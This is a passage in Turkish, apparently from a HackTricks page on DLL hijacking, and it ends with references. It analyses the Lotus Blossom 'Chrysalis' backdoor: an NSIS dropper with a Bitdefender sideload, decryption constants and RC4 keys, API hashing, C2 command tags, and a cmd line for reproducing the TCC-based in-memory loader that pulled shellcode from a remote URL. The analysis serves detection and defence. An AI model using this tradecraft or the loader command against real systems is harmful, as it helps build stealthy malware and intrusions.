- **Hunting:** `/p`, `/m` ve `/c` birlikte göründüğünde `forfiles` için uyarı oluşturun; bu kombinasyon yönetici script'leri dışında nadirdir.

## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom ihlali, NSIS ile paketlenmiş bir dropper kullanarak trusted update zincirini kötüye kullandı; bu dropper bir DLL sideload ve tamamen bellek içi payload'lar sahneliyordu.

Tradecraft akışı
- `update.exe` (NSIS) `%AppData%\Bluetooth` oluşturur, dizini **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe`, kötü amaçlı `log.dll` ve şifrelenmiş bir blob `BluetoothService` bırakır, sonra EXE'yi başlatır.
- Host EXE `log.dll`'i import eder ve `LogInit`/`LogWrite`'i çağırır. `LogInit` blob'u mmap ile yükler; `LogWrite` özel bir LCG-tabanlı stream ile (sabitler **0x19660D** / **0x3C6EF35F**, anahtar materyali önceki bir hash'ten türetilir) şifresini çözer, buffer'ı düz metin shellcode ile overwrite eder, geçici verileri serbest bırakır ve oraya atlar.
- IAT'den kaçınmak için loader, export isimlerini hash'leyerek API'leri çözer: **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanır, sonra Murmur-stili bir avalanche (**0x85EBCA6B**) uygular ve tuzlanmış hedef hash'lerle karşılaştırır.

Ana shellcode (Chrysalis)
- PE-benzeri ana modülü, anahtar `gQ2JR&9;` ile beş geçişli add/XOR/sub tekrarlarıyla deşifre eder, ardından import çözümlemeyi tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- Çalışma zamanında DLL isim dizelerini karakter başına bit-rotate/XOR dönüşümleriyle yeniden oluşturur, sonra `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`'i yükler.
- İkinci bir resolver kullanır: **PEB → InMemoryOrderModuleList**'de gezinir, her export tablosunu 4-bayt bloklarla Murmur-stili karıştırmayla parse eder ve hash bulunmazsa yalnızca `GetProcAddress`'e geri döner.

Gömülü konfigürasyon & C2
- Konfigürasyon bırakılan `BluetoothService` dosyasının içinde **offset 0x30808** (boyut **0x980**) olarak bulunur ve `qwhvb^435h&*7` anahtarıyla RC4 olarak deşifre edilince C2 URL'si ve User-Agent ortaya çıkar.
- Beacon'lar nokta-ile ayrılmış bir host profili oluşturur, başına `4Q` tag'ini koyar, sonra HTTPS üzerinden `HttpSendRequestA`'ya gönderilmeden önce `vAuig34%^325hGV` anahtarıyla RC4 ile şifreler. Yanıtlar RC4 ile deşifre edilir ve bir tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` dosya yazma, `4Y` okuma/exfil, `4\\` uninstall, `4` sürücü/dosya enum + chunked transfer vakaları).
- Çalışma modu CLI arg'larıyla kontrol edilir: arg yok = kalıcılık yükle (service/Run key) `-i`'yi işaret eder; `-i` kendini `-k` ile yeniden başlatır; `-k` yüklemeyi atlar ve payload'u çalıştırır.

Gözlemlenen alternatif loader
- Aynı ihlal Tiny C Compiler bırakıp `C:\ProgramData\USOShared\`'den `svchost.exe -nostdlib -run conf.c` çalıştırdı, yanına `libtcc.dll` koyuldu. Saldırgan sağlanan C kaynağına gömülü shellcode'u yerleştirdi, derledi ve PE'ye dokunmadan bellekte çalıştırdı. Bunu şu şekilde çoğaltın:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC tabanlı compile-and-run aşaması çalışma zamanında `Wininet.dll`'i içe aktardı ve sert kodlanmış bir URL'den ikinci aşama shellcode'u çekti; derleyici çalıştırması kılığına giren esnek bir loader sağladı.

## Referanslar

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
